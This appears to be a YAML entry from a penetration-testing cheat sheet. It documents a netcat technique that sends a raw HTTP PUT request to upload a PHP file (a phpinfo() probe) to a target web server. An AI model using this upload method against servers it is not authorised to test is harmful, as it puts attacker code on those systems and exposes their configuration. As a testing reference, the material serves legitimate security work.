---
description: |
  Netcat method of uploading a file using the PUT verb.

  Command Reference:

    Target: The target to connect to

  	Port: port to connect to

command: |
  nc <target> <port>
  PUT /file.php HTTP/1.1
  Content-type: text/html
  Content-length: <size in bytes>
  
  <?php phpinfo(); ?>
  
items:

target: |
  - Linux_target
  - MacOS_target
  - Windows_target
OS:
  - Linux
  - MacOS
environment: |
  - Web
command_types:
  - Admin
  - Information_Gathering
  - Host_Enumeration
references:

---
